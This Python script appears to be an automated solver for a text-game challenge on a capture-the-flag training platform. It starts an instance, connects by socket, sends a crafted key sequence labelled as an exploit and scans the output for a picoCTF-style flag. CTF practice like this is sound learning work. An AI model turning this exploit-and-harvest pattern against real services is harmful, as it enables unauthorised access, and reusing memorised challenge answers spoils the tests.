import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

EXPLOIT = "w" * 3 + "a" * 5 + "w" + "a" * 6 + "d" * 3 + "d" * 3 + "s" + "d"
SEQ = (EXPLOIT + "p") * 6

cy = CyLab(delay=1.0)
cy.login()
cy.req("PUT", "/api/challenges/446/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/446/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
s = socket.create_connection((host, port), timeout=30)
s.settimeout(15)
time.sleep(0.5)
try:
    s.recv(65536)
except Exception:
    pass
s.sendall(SEQ.encode())
found = None
levels = set()
t0 = time.time()
total = 0
buf_tail = b""
while time.time() - t0 < 120:
    try:
        c = s.recv(65536)
    except socket.timeout:
        break
    if not c:
        break
    total += len(c)
    for m in re.finditer(rb"Level: (\d+)", c):
        levels.add(int(m.group(1)))
    f = re.search(rb"(?:academy|picoCTF)\{[^}]*\}", c)
    if f:
        found = f.group(0).decode()
        break
    if b"No more lives" in c:
        break
print("octets recus:", total, "niveaux:", sorted(levels), "flag:", found)
s.close()
